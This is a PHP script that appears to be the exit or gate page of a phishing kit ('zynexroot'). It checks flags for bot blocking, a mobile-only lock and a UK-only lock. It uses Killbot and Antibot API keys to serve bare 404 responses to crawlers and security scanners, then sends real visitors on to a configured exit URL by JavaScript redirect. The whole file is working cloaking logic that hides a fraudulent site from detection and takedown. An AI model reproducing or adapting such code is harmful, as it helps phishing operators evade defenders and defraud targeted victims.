
<?php
include 'zynexroot/inc/config.php';
include 'zynexroot/inc/connect.php';
include 'new_anti_config.php';
if($internal_antibot == 1){
	include "zynexroot/inc/old_blocker.php";
}
if($mobile_lock == 1){
	include "zynexroot/inc/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($enable_antibot == 1){
	if(checkBot($antibot_key) == true){
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
echo '<script type="text/javascript">
           window.location = "'. $exit_url .'"
      </script>';
      
?>